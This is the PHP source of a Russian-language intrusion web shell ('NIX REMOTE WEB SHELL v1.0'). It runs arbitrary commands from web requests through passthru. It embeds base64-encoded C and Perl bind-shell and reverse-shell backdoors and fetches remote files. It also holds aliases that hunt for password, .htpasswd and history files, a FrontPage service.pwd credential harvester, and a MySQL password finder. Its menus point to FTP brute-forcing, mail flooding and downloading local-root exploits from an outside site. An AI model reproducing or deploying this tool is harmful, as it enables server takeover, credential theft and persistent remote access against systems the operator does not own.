<?php

#########################################################
#                 NIX REMOTE WEB SHELL                  #
#       Coded by DreAmeRz          Ver 1.0              #
#      ORIGINAL E-MAIL IS: dreamerz@mail.ru             #
#                 !!! PUBLIC VERSION !!!                #
#########################################################

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>NIX REMOTE WEB-SHELL v.1.0</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Content-Language" content="en,ru">
<META name="autor" content="DreAmeRz (www.Ru24-Team.NET)">
<style type="text/css">
BODY, TD, TR {
text-decoration: none;
font-family: Verdana;
font-size: 8pt;
scrollbar-face-color: #FFFFFF;
scrollbar-shadow-color:#000000 ;
scrollbar-highlight-color:#FFFFFF;
scrollbar-3dlight-color: #000000;
scrollbar-darkshadow-color:#FFFFFF ;
scrollbar-track-color: #FFFFFF;
scrollbar-arrow-color: #000000;
}
input, textarea, select {
font-family: Verdana;
font-size: 10px;
color: black;
background-color: white;
border: solid 1px;
border-color: black
}
UNKNOWN {
COLOR: black;
TEXT-DECORATION: none
}
A:link {COLOR:black; TEXT-DECORATION: none}
A:visited { COLOR:black; TEXT-DECORATION: none}
A:active {COLOR:black; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>
</HEAD>


<BODY bgcolor="#fffcf9" text="#000000">
<a href=adminarea.php>Â àäìèíêó </a>
<P align=center>[ <A href="javascript:history.next(+1)">Âïåðåä ] </A><B><FONT color=#cccccc size=4>*.NIX REMOTE WEB-SHELL</FONT></B>
v.1.0<FONT color=#linux size=1> Stable </FONT> [ <A href="javascript:history.back(-1)">Íàçàä ]</A>[ <A href="?ac=about" title='×òî óìååò ñêðèïò...'>Î ñêðèïòå ]</a><BR>
<A href="?ac=info" title='Óçíàé âñå îá ýòîé ñèñòåìå!'>[ Èíôîðìàöèÿ î ñèñòåìå</A> ][ <A href="?ac=navigation" title='Óäîáíàÿ ãðàôè÷åñêàÿ íàâèãàöèÿ. Ïðîñìîòð, ðåäàêòèðîâàíèå...'>Íàâèãàöèÿ</A> ][ <A href="?ac=backconnect" title='Óñòàíîâêà backconnect è îáû÷íîãî áåêäîðà '>Óñòàíîâêà
áåêäîðà</A> ][ <A href="?ac=eval" title='Ñîçäàé ñâîé ñêðèïò íà php ïðÿìî çäåñü :)'>PHP-êîä</A> ][ <A href="?ac=upload" title='Çàãðóçêà îäíîãî ôàéëà, ìàñcîâàÿ çàãðóçêà, çàãðóçêà ôàéëîâ ñ óäàëåííîãî êîìïüþòåðà!'>Çàãðóçêà ôàéëîâ</A> ][ <A href="?ac=shell" title='bash shell, àëüÿñû...'>Èñïîëíåíèå
êîìàíä ]</A> <br><A href="?ac=sql" title='Ðàáîòà ñ MySQL'> [ MySQL</A> ]<A href="?ac=sendmail" title='Îòïðàâü å-mail îòñþäà!'>[ Îòïðàâêà ïèñüìà</A> ][ <A href="?ac=mailfluder" title='Òåáÿ êòî-òî äîñòàë? Òîãäà òåáå ñþäà...'>Ìàèëôëóäåð</A>
 ][ <A href="?ac=tools" title='Êîäèðîâùèêè/äåêîäèðîâùèêè md5, des, sha1, base64... '>Èíñòðóìåíòû ]</A>[ <A href="?ac=ps" title='Îòîáðàæàåò ñïèñîê ïðîöåññîâ íà ñåðâåðå è ïîçâîëÿåò èõ óáèâàòü!'>Äåìîíû</A> ][ <A href="?ac=art" title='Àëüòåðíàòèâíûå ìåòîäû âçëîìà...'>Àëüòåðíàòèâíûå ìåòîäû</A> ][ <A href="?ac=exploits" title='id=root gid=0 uid=0'>/root</A> ][ <A href="?ac=selfremover" title='Íàäîåë ýòîò ñåðâåð? Òîãäà ìîæíî óäàëèòü è øåëë...'>Óäàëèòü øåëë</A> ]</P>
<?php
if (ini_get('register_globals') != '1') {

  if (!empty($HTTP_POST_VARS))
    extract($HTTP_POST_VARS);

  if (!empty($HTTP_GET_VARS))
    extract($HTTP_GET_VARS);
  if (!empty($HTTP_SERVER_VARS))
    extract($HTTP_SERVER_VARS);
}
Error_Reporting(E_COMPILE_ERROR|E_ERROR|E_CORE_ERROR);
set_magic_quotes_runtime(0);
set_time_limit(0);                // óáðàòü îãðàíè÷åíèå ïî âðåìåíè
ignore_user_abort(1);        // èãíîðèðîâàòü ðàçðûâ ñâÿçè ñ áðàóçåðîì
error_reporting(0);
$self = $_SERVER['PHP_SELF'];
$docr = $_SERVER['DOCUMENT_ROOT'];
$sern = $_SERVER['SERVER_NAME'];
if (($_POST['dir']!=="") AND ($_POST['dir'])) { chdir($_POST['dir']); }
$aliases=array(
'------------------------------------------------------------------------------------' => 'ls -la;pwd;uname -a',
'ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñî suid-áèòîì' => 'find / -type f -perm -04000 -ls',
'ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñî sgid-áèòîì' => 'find / -type f -perm -02000 -ls',
'ïîèñê â òåêóùåé äèðåêòîðèè âñåõ ôàéëîâ ñî sgid-áèòîì' => 'find . -type f -perm -02000 -ls',
'ïîèñê íà ñåðâåðå ôàéëîâ config' => 'find / -type f -name "config*"',
'ïîèñê íà ñåðâåðå ôàéëîâ admin' => 'find / -type f -name "admin*"',
'ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ config' => 'find . -type f -name "config*"',
'ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ pass' => 'find . -type f -name "pass*"',
'ïîèñê íà ñåðâåðå âñåõ äèðåêòîðèé è ôàéëîâ, îòêðûòûõ äëÿ çàïèñè' => 'find / -perm -2 -ls',
'ïîèñê â òåêóùåé äèðåêòîðèè âñåõ äèðåêòîðèé è ôàéëîâ, îòêðûòûõ äëÿ çàïèñè' => 'find . -perm -2 -ls',
'ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ service.pwd' => 'find . -type f -name service.pwd',
'ïîèñê íà ñåðâåðå ôàéëîâ service.pwd' => 'find / -type f -name service.pwd',
'ïîèñê íà ñåðâåðå ôàéëîâ .htpasswd' => 'find / -type f -name .htpasswd',
'ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ .htpasswd' => 'find . -type f -name .htpasswd',
'ïîèñê âñåõ ôàéëîâ .bash_history' => 'find / -type f -name .bash_history',
'ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ .bash_history' => 'find . -type f -name .bash_history',
'ïîèñê âñåõ ôàéëîâ .fetchmailrc' => 'find / -type f -name .fetchmailrc',
'ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ .fetchmailrc' => 'find . -type f -name .fetchmailrc',
'âûâîä ñïèñêà àòðèáóòîâ ôàéëîâ íà ôàéëîâîé ñèñòåìå ext2fs' => 'lsattr -va',
'ïðîñìîòð îòêðûòûõ ïîðòîâ' => 'netstat -an | grep -i listen',
'ïîèñê âñåõ php-ôàéëîâ ñî ñëîâîì password' =>'find / -name *.php | xargs grep -li password',
'ïîèñê ïàïîê ñ ìîäîì 777' =>'find / -type d -perm 0777',
'Îïðåäåëåíèå âåðñèè ÎÑ' =>'sysctl -a | grep version',
'Îïðåäåëåíèå âåðñèè ÿäðà' =>'cat /proc/version',
'Ïðîñìîòð syslog.conf' =>'cat /etc/syslog.conf',
'Ïðîñìîòð Message of the day' =>'cat /etc/motd',
'Ïðîñìîòð hosts' =>'cat /etc/hosts',
'Âåðñèÿ äèñòðèáóòèâà 1' =>'cat /etc/issue.net',
'Âåðñèÿ äèñòðèáóòèâà 2' =>'cat /etc/*-realise',
'Ïîêàçàòü âñå ïðîöåñû' =>'ps auxw',
'Ïðîöåññû òåêóùåãî ïîëüçîâàòåëÿ' =>'ps ux',
'Ïîèñê httpd.conf' =>'locate httpd.conf');



/* Port bind source */
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5
jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5
ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW5
0IGFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnV
mWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVtb3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0
KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyh
hdG9pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0F
OWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2N
rZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2F
kZHIgKikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB
7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQogICBkdXAyKG5ld2ZkLDApOw0KICAgZHV
wMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ
6IiwxMCk7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyh
hcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY29tZSB0byByNTcgc2hlbGwgJiYgL2J
pbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGN
sb3NlKG5ld2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW5
0ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVudGVyZWQpO2krKykgDQp7DQppZih
lbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID0
9ICdccicpDQplbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCk
pDQpyZXR1cm4gMDsNCn0=";

$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZi
AoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMSVNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2
NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORV
QsJlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQ
pzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZH
JfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw
0KbGlzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCm
FjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspKQ0Kew0KZGllICJDYW5ub3QgZm9yayIgaW
YgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+Jk
NPTk4iOw0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ0
9OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3NlIENPTk47DQpleGl0IDA7DQp9DQp9";

$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ
HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZ
DsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJ
HRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0L
CAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgnd
GNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBka
WUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yO
iAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLR
VQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlK
FNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0
KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10
pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJ
ybSAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2l
uLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA
9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMSt
zdHJsZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVB
QUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4
sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCg
pIik7DQogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1
zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWN
sKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

if(isset($uploadphp))
{
$socket=fsockopen($iphost,$loadport);                                        //connect
fputs($socket,"GET $loadfile HTTP/1.0\nHOST:cd\n\n");        //request
while(fgets($socket,31337)!="\r\n" && !feof($socket)) {
unset($buffer); }
while(!feof($socket)) $buffer.=fread($socket, 1024);
$file_size=strlen($buffer);
$f=fopen($loadnewname,"wb+");
fwrite($f, $buffer, $file_size);
echo "Ðàçìåð çàãðóæåííîãî ôàéëà: $file_size <b><br><br>" ;
}

if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}
elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}
else {$ac = "navigation";}



switch($ac) {

// Shell
case "shell":
echo "<SCRIPT LANGUAGE='JavaScript'>
<!--
function pi(str) {
        document.command.cmd.value = str;
        document.command.cmd.focus();
}
//-->
</SCRIPT>";

/* command execute */
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="id;pwd;uname -a;ls -lad"; }

if (($_POST['alias']) AND ($_POST['alias']!==""))
 {
 foreach ($aliases as $alias_name=>$alias_cmd) {
                                               if ($_POST['alias'] == $alias_name) {$_POST['cmd']=$alias_cmd;}
                                               }
 }


echo "<font face=Verdana size=-2>Âûïîëíåííàÿ êîìàíäà: <b>".$_POST['cmd']."</b></font></td></tr><tr><td>";
echo "<b>";
echo "<div align=center><textarea name=report cols=145 rows=20>";
echo "".passthru($_POST['cmd'])."";
echo "</textarea></div>";
echo "</b>";
?>
</td></tr>

<tr><b><div align=center>:: Âûïîëíåíèå êîìàíä íà ñåðâåðå ::</div></b></font></td></tr>
<tr><td height=23>
<TR>
        <CENTER>
 <TD><A HREF="javascript:pi('cd ');" class=fcom>| cd</A> |</TD>
        <TD><A HREF="javascript:pi('cat ');" class=fcom>| cat</A> |</TD>
        <TD><A HREF="javascript:pi('echo ');" class=fcom>echo</A> |</TD>
        <TD><A HREF="javascript:pi('wget ');" class=fcom>wget</A> |</TD>
        <TD><A HREF="javascript:pi('rm ');" class=fcom>rm</A> |</TD>
        <TD><A HREF="javascript:pi('mysqldump ');" class=fcom>mysqldump</A> |</TD>
        <TD><A HREF="javascript:pi('who');" class=fcom>who</A> |</TD>
        <TD><A HREF="javascript:pi('ps -ax');" class=fcom>ps -ax</A> |</TD>
  <TD><A HREF="javascript:pi('cp ');" class=fcom>cp</A> |</TD>
  <TD><A HREF="javascript:pi('pwd');" class=fcom>pwd</A> |</TD>
 <TD><A HREF="javascript:pi('perl  ');" class=fcom>perl</A> |</TD>
 <TD><A HREF="javascript:pi('gcc ');" class=fcom>gcc</A> |</TD>
 <TD><A HREF="javascript:pi('locate ');" class=fcom>locate</A> |</TD>
  <TD><A HREF="javascript:pi('find ');" class=fcom>find</A> |</TD>
  <TD><A HREF="javascript:pi('ls -lad');" class=fcom>ls -lad</A> |</TD>
       </CENTER>
</TR>

<?
/* command execute form */
echo "<form name=command method=post>";

echo "<b>Âûïîëíèòü êîìàíäó</b>";
echo "<input type=text name=cmd size=85><br>";
echo "<b>Ðàáî÷àÿ äèðåêòîðèÿ &nbsp;</b>";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=text name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=text name=dir size=85 value=".$_POST['dir'].">"; }
echo "<input type=submit name=submit value=Âûïîëíèòü>";

echo "</form>";

/* aliases form */
echo "<form name=aliases method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Âûáåðèòå àëèàñ<font face=Wingdings color=gray></font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<select name=alias>";
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 echo "<option>$alias_name</option>";
 }
 echo "</select>";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=hidden name=dir size=85 value=".$_POST['dir'].">"; }
echo "&nbsp;&nbsp;<input type=submit name=submit value=Âûïîëíèòü>";
echo "</font>";
echo "</form>";


break;
case "art":
echo "<a href='?ac=frontpage'><b>FrontPage Exploit by Nitrex</b></a><br>
Ýêñïëîéò äëÿ FrontPage. Ñîáèðàåò ÷èòàåìûå .htpassword ôàéëû ïî âñåìó ñåðâåðó. Ïîçâîëÿåò ñîçäàòü íåõèëóþ áàçó âñåõ ñàéòîâ â âèäå ëîãèí:ïàðîëü îò õîñòåðà, òî åñòü ïàðîëè ê FrontPage ïîäõîäÿò ê FTP è äðóãèì ñåðâèñàì ñåðâåðà. Ðàññøèôðîâêà ïðîèçâîäèòñÿ ñ ïîìîùüþ John The Ripper (Standart/DES).<br><br>
<a href='?ac=dbexploit'><b>MySQL Find Config Exploit by DreAmeRz</b></a><br>
Ýêñïëîèò, ïîçâîëÿþùèé îáëåã÷èòü ïîèñê ïàðîëåé ê áàçå äàííûõ. Ïðîèçâîäèòñÿ ïîèñê ôàéëîâ ñ óïîìèíàíèåì ðÿäà ñòðîê, óêàçûâàþùèõ íà êîííåêò ê MySQL. Òàêæå âîçìîæíî ñîâïàäåíèå ïàðîëåé ñ äðóãèìè ñåðâèñàìè ñåðâåðà. Ïàðîëè â áîëüøåíñòâå ñëó÷àåâ èëè âîâñå íå çàøèôðîâàíû, èëè çàøèôðîâàíû îáðàòèìûì àëãîðèòìîì. Ïðîàíàëèçèðîâàâ ôàéëû, óêàçàííûå ýêñïëîèòîì, âû áûñòðî íàéäåòå ïàðîëü ê MySQL.<br><br>
<a href='?ac=ftp'><b>FTP Brut by xoce</b></a><br>
Ïîëíîöåííûé áðóòôîðñåð, ðàáîòàþùèé ïî ìåòîäó ïîäñòàíîâêè ïàðîëåé, êîòîðûå áåðåò èç ôàéëà. Ôàéë ãåíåðèðóåòñÿ ñàì, âû òîëüêî óêàçûâàåòå ÷èñëî ïàðîëåé è... âñå - ïåðåáîð íà÷èíàåòñÿ!!! Ñ ïîìîùüþ äàííîãî áðóòôîðñåðà âû ñìîæåòå ïîäîáðàòü ïàðîëü ê ëþáîìó õîñòèíãó áåç ïðîáëåì! ×òîáû áûëî ÷òî ïåðåáèðàòü, áûëà äîáàâëåíà áàçà ïàðîëåé, êîòîðàÿ ãåíåðèðóåòñÿ íà ëåòó (íå ïèøèòå áîëüøèå öèôðû â êîëè÷åñòâå ïàðîëåé, òàê êàê ýòî ñåðüåçíàÿ íàãðóçêà íà ñåðâåð! 10000 âïîëíå õâàòèò).<br><br>
<a href='?ac=ftppass'><b>FTP login:login Brut by Terabyte</b></a><br>
Ýêñïëîèò ïîçâîëÿåò ïåðåáðàòü àêêàóíò íà FTP íà ñâÿçêó login:login. ×åì áîëüøå þçåðîâ â /etc/passwd, òåì áîëüøå âåðîÿòíîñòü óäà÷íîé ðàáîòû ýêñïëîèòà.<br><br>
<a href='?ac=shell'><b>Íåêîòîðûå äðóãèå ìèíè-ýêñïëîèòû ïðèâåäåíû çäåñü â àëüÿñàõ.</b></a><br>";
break;
case "frontpage":
$p=getenv("DOCUMENT_ROOT");
if(exec("cat /etc/passwd")){
$ex=explode("/", $p);
$do_login=substr($p,0,strpos($p,$ex[2]));
$next_login=substr($p,strpos($p,$ex[2])+strlen($ex[2]));
exec("cat /etc/passwd", $passwd);
for($i=0; $i<=count($passwd); $i++) {
$xz=explode(":", $passwd[$i]);
$file="/".$do_login.$xz[0].$next_login."/_vti_pvt/service.pwd";
if(exec("cat ".$file)){
exec("cat ".$file,$open);
$a=$open[count($open)-1];
$fr=strpos($a, ":");
$open1=substr($a, $fr);
if($xz[4]=='') {
$file1="/".$do_login.$xz[0].$next_login."/_vti_pvt/.htaccess";
Unset($domain);
exec("cat ".$file1,$domain);
$domain1=explode(" ",$domain[8]);
$xz[4]=$domain1[1];
}
echo $xz[0].$open1.":".$xz[2].":".$xz[3].":".$xz[4].":".$xz[5].":".$xz[6]."<br>";
} }
}
elseif(is_file("/etc/passwd")){
$ex=explode("/", $p);
$passwd="/etc/passwd";
echo "Ïóòü:&nbsp".$p."<br>";
$do_login=substr($p,0,strpos($p,$ex[2]));
$next_login=substr($p,strpos($p,$ex[2])+strlen($ex[2]));
if(is_file($passwd)) {
$open=fopen($passwd,"r");
while (!feof($open)) {
$str=fgets($open, 100);
$mas=explode(":", $str);
$file="/".$do_login.$mas[0]."/".$next_login."/_vti_pvt/service.pwd";
if(is_file($file)) {
echo $mas[0];
$open1=fopen($file, "r");
$str1=fread($open1,filesize($file));
fclose($open1);
$fr=strpos($str1, ":");
$str2=substr($str1, $fr);
$str2=rtrim($str2);
//
if($mas[4]=='') {
$file1="/".$do_login.$mas[0]."/".$next_login."/_vti_pvt/.htaccess";
$open2=fopen($file1,"r");
$domain=fread($open2,filesize($file1));
fclose($open2);
$domain1=substr($domain,106,110);
$domain2=explode("AuthUserFile",$domain1);
$mas[4]=$domain2[0];
}
//
echo $str2.":".$mas[2].":".$mas[3].":".$mas[4].":".$mas[5].":".$mas[6]."<br>";
}
}
fclose($open);
}
}
else{
echo "Ñ ïàññîì îáëîì :(((";
}
break;
case "dbexploit":
echo "<PRE>";
echo "<b>Â ôàéëå ïðèñóòñòâóåò ôóíêöèÿ mysql_connect: </b><br>";
exec("find / -name *.php | xargs grep -li mysql_connect");
exec("find / -name *.inc | xargs grep -li mysql_connect");
exec("find / -name *.inc.php | xargs grep -li mysql_connect");
echo "<b>Â ôàéëå ïðèñóòñòâóåò ôóíêöèÿ mysql_select_db: </b><br>";
exec("find / -name *.php | xargs grep -li mysql_select_db");
exec("find / -name *.inc | xargs grep -li mysql_select_db");
exec("find / -name *.inc.php | xargs grep -li mysql_select_db");
echo "<b>Â ôàéëå ïðèñóòñòâóåò óïîìèíàíèå ïàðîëÿ: </b><br>";
exec("find / -name *.php | xargs grep -li $password");
exec("find / -name *.inc | xargs grep -li $password");
exec("find / -name *.inc.php | xargs grep -li $password");
exec("find / -name *.php | xargs grep -li $pass");
exec("find / -name *.inc | xargs grep -li $pass");
exec("find / -name *.inc.php | xargs grep -li $pass");
echo "<b>Â ôàéëå ïðèñóòñòâóåò ñëîâî localhost: </b><br>";
exec("find / -name *.php | xargs grep -li localhost");
exec("find / -name *.inc | xargs grep -li localhost");
exec("find / -name *.inc.php | xargs grep -li localhost");
echo "</PRE>";
break;
// ñïèñîê ïðîöåññîâ
case "ps":
echo "<b>Ïðîöåññû â ñèñòåìå:</b><br>";

  echo "<br>";
  if ($pid)
  {
   if (!$sig) {$sig = 9;}
   echo "Îòïðàâëåíèå êîìàíäû ".$sig." to #".$pid."... ";
   $ret = posix_kill($pid,$sig);
   if ($ret) {echo "Âñå, ïðîöåññ óáèò, àìèíü";}
   else {echo "ÎØÈÁÊÀ! ".htmlspecialchars($sig).", â ïðîöåññå #".htmlspecialchars($pid).".";}
  }
  $ret = `ps -aux`;
  if (!$ret) {echo "Íåâîçìîæíî îòîáðàçèòü ñïèñîê ïðîöåññîâ! Âèäíî, çëîé àäìèí çàïðåòèë ps";}
  else
  {
   $ret = htmlspecialchars($ret);
   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
   $stack = explode("\n",$ret);
   $head = explode(" ",$stack[0]);
   unset($stack[0]);
   if (empty($ps_aux_sort)) {$ps_aux_sort = $sort_default;}
   if (!is_numeric($ps_aux_sort[0])) {$ps_aux_sort[0] = 0;}
   $k = $ps_aux_sort[0];
   if ($ps_aux_sort[1] != "a") {$y = "<a href=\"".$surl."?ac=ps&d=".urlencode($d)."&ps_aux_sort=".$k."a\"></a>";}
   else {$y = "<a href=\"".$surl."?ac=ps&d=".urlencode($d)."&ps_aux_sort=".$k."d\"></a>";}
   for($i=0;$i<count($head);$i++)
   {
    if ($i != $k) {$head[$i] = "<a href=\"".$surl."?ac=ps&d=".urlencode($d)."&ps_aux_sort=".$i.$ps_aux_sort[1]."\"><b>".$head[$i]."</b></a>";}
   }
   $prcs = array();
   foreach ($stack as $line)
   {
    if (!empty($line))
        {
         echo "<tr>";
     $line = explode(" ",$line);
     $line[10] = join(" ",array_slice($line,10,count($line)));
     $line = array_slice($line,0,11);
     $line[] = "<a href=\"".$surl."?ac=ps&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
     $prcs[] = $line;
     echo "</tr>";
    }
   }
   $head[$k] = "<b>".$head[$k]."</b>".$y;
   $head[] = "<b>ACTION</b>";
   $v = $ps_aux_sort[0];
   usort($prcs,"tabsort");
   if ($ps_aux_sort[1] == "d") {$prcs = array_reverse($prcs);}
   $tab = array();
   $tab[] = $head;
   $tab = array_merge($tab,$prcs);
   echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=white borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\">";
   foreach($tab as $k)
   {
    echo "<tr>";
    foreach($k as $v) {echo "<td>".$v."</td>";}
    echo "</tr>";
   }
   echo "</table>";
  }
break;
// exploits for root...
case "exploits":
// thanks to xoce
$public_site = "http://hackru.info/adm/exploits/public_exploits";
$private_site = "http://hackru.info/adm/exploits/private_exploits";
echo"Ýòîò ðàçäåë ñîçäàí ïî ðÿäó ïðè÷èí. Âî-ïåðâûõ, óæå íàäîåëî èñêàòü îäíè è òåæå ýêñïëîèòû, âî-âòîðûõ - êîìïèëèðîâàíèå è èñïðàâëåíèå ñîðöîâ ïîä êîíêðåòíóþ ïëàòôîðìó óæå òîæå íå ïðèíîñèò óäîâîëüñòâèÿ. Âñå ýêñïëîèòû ñêîìïèëèðîâàíû è íàñòðîåíû. Ñàìîìó êîìïèëèðîâàòü áûëî âëîì, ïîýòîìó âîñïîëüçîâàëñÿ ãîòîâûìè :) Âûðàæàþ áëàãîäàðíîñòü xoce (hackru.info)<br><br>
<a href='?ac=upload&file3=$public_site/m&file2=/tmp'>Local ROOT for linux 2.6.20 - mremap (./m)</a><br>
<a href='?ac=upload&file3=$public_site/p&file2=/tmp'>Local ROOT for linux 2.6.20 - ptrace (./p)</a><br>
<a href='?ac=upload&file3=$private_site/brk&file2=/tmp'>BRK - Local Root Unix 2.4.*(./brk)</a><br>
<a href='?ac=upload&file3=$private_site/sortrace&file2=/tmp'>Traceroute v1.4a5 exploit by sorbo (./sortrace)</a><br>
<a href='?ac=upload&file3=$private_site/root&file2=/tmp'>Local Root Unix 2.4.* (./root)</a><br>
